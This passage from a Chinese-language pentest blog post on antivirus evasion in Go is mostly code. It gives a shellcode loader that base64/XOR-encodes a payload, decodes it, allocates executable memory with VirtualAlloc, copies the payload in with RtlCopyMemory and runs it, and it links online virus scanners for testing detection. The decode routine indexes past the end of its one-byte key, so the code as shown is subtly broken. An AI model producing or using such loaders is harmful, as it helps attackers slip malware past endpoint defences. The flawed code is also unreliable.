class="params">(file <span class="type">string</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">shellcode, err := ioutil.ReadFile(file)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Print(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> shellcode</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">shellcode := getFileShellCode(<span class="string">&quot;payload.bin&quot;</span>)</span><br><span class="line">fmt.Println(getEnCode(shellcode))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><ul><li>bin文件太大的话，加密后的字符会很多，可以重定向到文件中</li></ul><figure class="highlight bash"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-bhyloilr592jbb"></i><span>  Bash  </span><div class="collapse show" id="collapse-bhyloilr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ go run xor_shellcode.go &gt; xor.txt</span><br></pre></td></tr></table></div></figure><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>Shellcode的执行步骤：首先需要通过Loader加载器去申请一块内存，然后使用将Shellcode加载到这块内存：中，最后执行这块内存。</p><ul><li>首先定义用到的函数和变量</li></ul><figure class="highlight go"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-lbgp16lr592jbb"></i><span>  Go  </span><div class="collapse show" id="collapse-lbgp16lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">PAGE_EXECUTE_READWRITE = <span class="number">0x40</span>  <span class="comment">// 区域可以执行代码，应用程序可以读写该区域。</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> kk = []<span class="type">byte</span>&#123;<span class="number">0x21</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">kernel32      = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">ntdll         = syscall.MustLoadDLL(<span class="string">&quot;ntdll.dll&quot;</span>)</span><br><span class="line">VirtualAlloc  = kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line"><span class="comment">// RtlMoveMemory = ntdll.MustFindProc(&quot;RtlMoveMemory&quot;)</span></span><br><span class="line">    RtlCopyMemory = ntdll.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></div></figure><ul><li>编写Shellcode的解密代码，还原恶意载荷</li></ul><figure class="highlight go"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-w0snpclr592jbb"></i><span>  Go  </span><div class="collapse show" id="collapse-w0snpclr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getDeCode</span><span class="params">(src <span class="type">string</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">ss, _ := base64.StdEncoding.DecodeString(src)</span><br><span class="line"><span class="keyword">var</span> shellcode []<span class="type">byte</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(ss); i++ &#123;</span><br><span class="line">shellcode = <span class="built_in">append</span>(shellcode, ss[i]^kk[<span class="number">1</span>]^kk[<span class="number">2</span>])</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> shellcode</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><ul><li>申请内存，然后加载Shellcode到申请的内存块并执行</li></ul><figure class="highlight go"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-ruryiylr592jbb"></i><span>  Go  </span><div class="collapse show" id="collapse-ruryiylr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 此处填写前面混淆后的Shellcode</span></span><br><span class="line"><span class="keyword">var</span> shellcode = <span class="string">&quot;&lt;Shellcode&gt;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 解密Shellcode</span></span><br><span class="line">charcode := getDeCode(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 申请内存</span></span><br><span class="line">addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载Shellcode</span></span><br><span class="line">_, _, err = RtlCopyMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;charcode[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(charcode)))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行内存</span></span><br><span class="line">syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><ul><li>完整代码：</li></ul><figure class="highlight go"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-3ohrx3lr592jbb"></i><span>  Go  </span><div class="collapse show" id="collapse-3ohrx3lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br><span class="line"><span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">PAGE_EXECUTE_READWRITE = <span class="number">0x40</span> <span class="comment">// 区域可以执行代码，应用程序可以读写该区域。</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> kk = []<span class="type">byte</span>&#123;<span class="number">0x21</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">kernel32     = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">ntdll        = syscall.MustLoadDLL(<span class="string">&quot;ntdll.dll&quot;</span>)</span><br><span class="line">VirtualAlloc = kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line"><span class="comment">// RtlMoveMemory = ntdll.MustFindProc(&quot;RtlMoveMemory&quot;)</span></span><br><span class="line">RtlCopyMemory = ntdll.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Shellcode解密</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getDeCode</span><span class="params">(src <span class="type">string</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">ss, _ := base64.StdEncoding.DecodeString(src)</span><br><span class="line"><span class="keyword">var</span> shellcode []<span class="type">byte</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(ss); i++ &#123;</span><br><span class="line">shellcode = <span class="built_in">append</span>(shellcode, ss[i]^kk[<span class="number">1</span>]^kk[<span class="number">2</span>])</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> shellcode</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 此处填写前面混淆后的Shellcode</span></span><br><span class="line"><span class="keyword">var</span> shellcode = <span class="string">&quot;&lt;Shellcode&gt;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 解密Shellcode</span></span><br><span class="line">charcode := getDeCode(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 申请内存</span></span><br><span class="line">addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载Shellcode</span></span><br><span class="line">_, _, err = RtlCopyMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;charcode[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(charcode)))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行内存</span></span><br><span class="line">syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><ul><li>前面加密算法部分待改进，此处仅做演示。现在已过不了火绒了，下班</li></ul><p><a data-fancybox="gallery" data-src="/assets/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2-2.png" data-caption="Go免杀初探-2"><img src="/assets/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2-2.png" alt="Go免杀初探-2"></a></p><ul><li>参考文章：<ul><li><a href="https://blog.csdn.net/superjiangzhen/article/details/79938458">程序内存空间（代码段、数据段、堆栈段）</a></li><li><a href="https://yunshanwuyin.com/BlogDetail?Id=thutgzhvtyyn4ezxzps6kcfu">初探Shellcode免杀</a></li><li><a href="https://forum.butian.net/share/736">CS 免杀学习</a></li><li><a href="https://github.com/Rvn0xsy/BadCode">https://github.com/Rvn0xsy/BadCode</a></li><li><a href="https://github.com/aahmad097/AlternativeShellcodeExec">https://github.com/aahmad097/AlternativeShellcodeExec</a></li></ul></li><li>在线杀毒检测：<ul><li><a href="https://www.virustotal.com/gui/home/upload">https://www.virustotal.com/gui/home/upload</a></li><li><a href="https://www.virscan.org/">https://www.virscan.org/</a></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bypass </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
